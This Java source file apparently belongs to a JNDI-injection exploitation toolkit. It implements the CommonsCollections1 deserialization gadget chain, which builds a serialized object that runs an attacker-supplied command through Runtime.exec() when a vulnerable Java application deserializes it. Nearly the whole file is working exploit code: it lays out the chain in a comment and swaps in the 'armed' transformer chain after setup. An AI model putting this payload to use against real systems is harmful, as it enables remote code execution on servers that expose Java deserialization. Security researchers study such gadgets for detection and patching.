package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.JavaVersion;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import com.nu1r.jndi.utils.Util;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 * AnnotationInvocationHandler.readObject()
 * Map(Proxy).entrySet()
 * AnnotationInvocationHandler.invoke()
 * LazyMap.get()
 * ChainedTransformer.transform()
 * ConstantTransformer.transform()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Class.getMethod()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.getRuntime()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.exec()
 * <p>
 * Requires:
 * commons-collections
 */
public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {

    public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        final Map               innerMap = new HashMap();
        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
